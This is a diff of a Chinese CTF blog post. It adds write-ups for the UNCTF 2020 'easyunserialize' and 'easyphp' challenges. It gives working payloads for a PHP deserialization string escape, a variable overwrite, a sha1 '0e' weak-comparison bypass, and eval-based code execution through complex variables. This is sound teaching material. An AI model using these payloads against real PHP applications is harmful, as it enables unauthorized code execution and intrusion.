@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      804 字
+      1.7k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      25
        分钟
     </span>
   
@@ -241,12 +241,14 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：几秒前
+                  本文最后更新于：11 分钟前
                 
               </p>
             
             <div class="markdown-body" id="post-body">
               <p>比赛和考试时间有点冲突，也没有好好做题，只好结束复现一下。</p>
+<a id="more"></a>
+
 <h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">echo</span><span class="hljs-string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;
 highlight_file(<span class="hljs-keyword">__FILE__</span>);
@@ -272,7 +274,7 @@ $url = $_GET[<span class="hljs-string">'url'</span>];
 <span class="hljs-regexp">//</span>()里可以填任意字符除了正则过滤的几个协议</code></pre></div>
 
 <p><strong>原理：</strong>当php遇到一个不认识的protocol时，会抛出一个warning，并将protocol设置为null,在protoco为null或file时，则进行本地操作。默认情况下不传协议或传入了不存在协议，会进行本地文件操作。</p>
-<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p><strong>考察点是反序列化字符逃逸</strong></p>
+<h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><p><strong>考察点是反序列化字符逃逸</strong></p>
 <p>先冲简单的PHP反序列化字符逃逸了解什么是反序化逃逸。</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($str)</span></span>&#123;
@@ -334,6 +336,177 @@ $c=unserialize($res);
 <p>这里pass的值就被该称了hacker</p>
 <p>总结：<strong>逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。</strong></p>
 <p><a href="https://www.cnblogs.com/Sumarua/p/12932401.html" target="_blank" rel="noopener">参考</a></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> $uname;
+    <span class="hljs-keyword">public</span> $password;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($uname,$password)</span></span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;uname=$uname;
+        <span class="hljs-keyword">$this</span>-&gt;password=$password;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>
+<span class="hljs-function">    </span>&#123;
+            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-string">'easy'</span>)
+            &#123;
+                <span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);
+                <span class="hljs-keyword">echo</span> $flag;    
+            &#125;
+            <span class="hljs-keyword">else</span>
+            &#123;
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">'wrong password'</span>;
+            &#125;
+        &#125;
+    &#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($string)</span></span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'challenge'</span>,<span class="hljs-string">'easychallenge'</span>,$string);
+&#125;
+
+$uname=$_GET[<span class="hljs-number">1</span>];
+$password=<span class="hljs-number">1</span>;
+$ser=filter(serialize(<span class="hljs-keyword">new</span> a($uname,$password)));
+$test=unserialize($ser);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>这段代码的意思大致为，get方式提交一个1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是</p>
+<p>需要构造的属性</p>
+<div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;&#125;</code></pre></div>
+
+<p>可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。</p>
+<div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"aaaa"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"a"</span>;&#125;</code></pre></div>
+
+<p>上面构造出的payload长度为48因此还需要12个challenge。</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> $uname=<span class="hljs-string">'challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";s:4:"aaaa";s:1:"a";&#125;'</span>;
+    <span class="hljs-keyword">public</span> $password=<span class="hljs-string">"1"</span>;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($string)</span></span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'challenge'</span>,<span class="hljs-string">'easychallenge'</span>,$string);
+&#125;
+$ser=filter(serialize(<span class="hljs-keyword">new</span> a($uname,$password)));
+<span class="hljs-keyword">echo</span>($ser);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+
+
+<div class="hljs"><pre><code class="hljs scss">O:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">"uname"</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">"easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge"</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"easy"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"aaaa"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;";s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"1"</span>;&#125;
+
+<span class="hljs-comment">//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge  长度为156</span></code></pre></div>
+
+<p>finalpayload：</p>
+<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge</span>";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"aaaa"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"a"</span>;&#125;</code></pre></div>
+
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>给了提示  /source查看源码</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+$adminPassword = <span class="hljs-string">'d8b8caf4df69a81f2815pbcb74cd73ab'</span>;
+<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">'fuxkSQL'</span>)) &#123;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fuxkSQL</span><span class="hljs-params">($iText)</span>    </span>
+<span class="hljs-function">    </span>&#123;
+        $oText = $iText;
+        $oText = str_replace(<span class="hljs-string">'\\\\'</span>, <span class="hljs-string">'\\'</span>, $oText);
+        $oText = str_replace(<span class="hljs-string">'\"'</span>, <span class="hljs-string">'"'</span>, $oText);
+        $oText = str_replace(<span class="hljs-string">"\'"</span>, <span class="hljs-string">"'"</span>, $oText);
+        $oText = str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"''"</span>, $oText);
+        <span class="hljs-keyword">return</span> $oText;
+    &#125;
+&#125;
+<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">'getVars'</span>)) &#123;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getVars</span><span class="hljs-params">()</span></span>
+<span class="hljs-function">    </span>&#123;
+        $totals = array_merge($_GET, $_POST);
+        <span class="hljs-keyword">if</span> (count($_GET)) &#123;
+            <span class="hljs-keyword">foreach</span> ($_GET <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;
+                <span class="hljs-keyword">global</span> $&#123;$key&#125;;
+                <span class="hljs-keyword">if</span> (is_array($value)) &#123;
+                    $temp_array = <span class="hljs-keyword">array</span>();
+                    <span class="hljs-keyword">foreach</span> ($value <span class="hljs-keyword">as</span> $key2 =&gt; $value2) &#123;
+                        <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'mysql_real_escape_string'</span>)) &#123;
+                            $temp_array[$key2] = fuxkSQL(trim($value2));
+                        &#125; <span class="hljs-keyword">else</span> &#123;
+                            $temp_array[$key2] = str_replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">'\"'</span>, str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"\'"</span>, (trim($value2))));
+                        &#125;
+                    &#125;
+                    $&#123;$key&#125; = $_GET[$key] = $temp_array;
+                &#125; <span class="hljs-keyword">else</span> &#123;
+                    <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'mysql_real_escape_string'</span>)) &#123;
+                        $&#123;$key&#125; = fuxkSQL(trim($value));
+                    &#125; <span class="hljs-keyword">else</span> &#123;
+                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">'\"'</span>, str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"\'"</span>, (trim($value))));
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+getVars();
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($source)) &#123;
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125;
+<span class="hljs-comment">//只有admin才能设置环境变量</span>
+<span class="hljs-keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">'you can set config variables!!'</span> . <span class="hljs-string">'&lt;/br&gt;'</span>;
+    <span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;
+        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="hljs-number">12</span>) &#123;
+            @<span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$$key"</span> . <span class="hljs-string">'="'</span> . $GLOBALS[$key] . <span class="hljs-string">'";'</span>);
+        &#125;
+    &#125;
+&#125; <span class="hljs-keyword">else</span> &#123;
+    <span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;
+        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key)) &#123;
+            <span class="hljs-keyword">echo</span> ($GLOBALS[$key]) . <span class="hljs-string">'&lt;/br&gt;'</span>;
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+<p>代码很长，但是很容易理解 </p>
+<p>fuxkSQL是将可能存在sql注入的符号转义</p>
+<p>getvarh是将传的参数赋值</p>
+<p>global ${$key};这里存在两个$$，所以可能存在变量覆盖</p>
+<p>if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) </p>
+<p>$password的md5值与adminPassword,这里可以利用变量覆盖绕过</p>
+<p>password=111&amp;adminPassword=md(111)</p>
+<p>sha1($verif)==$verif弱类型比较，也很容易绕过</p>
+<p>sha1($a)=0exxx</p>
+<p>只要找出0e开头的字符串的sha1值为0e开头</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">for</span> ($i5 = <span class="hljs-number">0</span>; $i5 &lt;= <span class="hljs-number">9999999999</span>; $i5++) &#123;
+    $res = <span class="hljs-string">'0e'</span> . $i5;
+    <span class="hljs-comment">//0e1290633704</span>
+    <span class="hljs-keyword">if</span> ($res == hash(<span class="hljs-string">'sha1'</span>, $res)) &#123;
+        print_r($res);
+    &#125;
+&#125;</code></pre></div>
+
+<p>所以verif=0e1290633704</p>
+<p>重点在这</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;
+        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="hljs-number">12</span>) &#123;
+            @<span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$$key"</span> . <span class="hljs-string">'="'</span> . $GLOBALS[$key] . <span class="hljs-string">'";'</span>);
+        &#125;
+    &#125;</code></pre></div>
+
+<ul>
+<li>这段是将设置var开头，后面带1到2个数字变量的值，类似于var1=xxx或者var12=xxx 这样的</li>
+<li>由于变量覆盖的环节限制了单双引号的输入，所以这里的解法为利用php复杂变量getshell</li>
+</ul>
+<p>什么是php复杂变量getshell</p>
+<p>PHP复杂变量</p>
+<p>{}不能被转移，其包裹的部分可当作变量<br>就是${phpinfo()}和{${phpinfo()}}是一样的，花括号{}只是用于区别变量边界的标识符</p>
+<p>payload:</p>
+<div class="hljs"><pre><code class="hljs dts">?source=<span class="hljs-number">1</span><span class="hljs-variable">&amp;</span>adminPassword=c4ca4238a0b923820dcc509a6f75849b<span class="hljs-variable">&amp;password</span>=<span class="hljs-number">1</span><span class="hljs-variable">&amp;verif</span>=<span class="hljs-number">0e1290633704</span><span class="hljs-variable">&amp;var1</span>=&#123;$_GET[<span class="hljs-number">1</span>]&#125;<span class="hljs-variable">&amp;var3</span>=$&#123;$var1()&#125;<span class="hljs-variable">&amp;1</span>=phpinfo
+<span class="hljs-comment">//var1=&#123;phpinfo&#125;  </span>
+<span class="hljs-comment">//var3=$&#123;$var1&#125;=$&#123;phpinfo&#125;</span></code></pre></div>
+
+<p>flag藏在phpinfo中，ctrl+f搜素flag即可</p>
 
             </div>
             <hr>
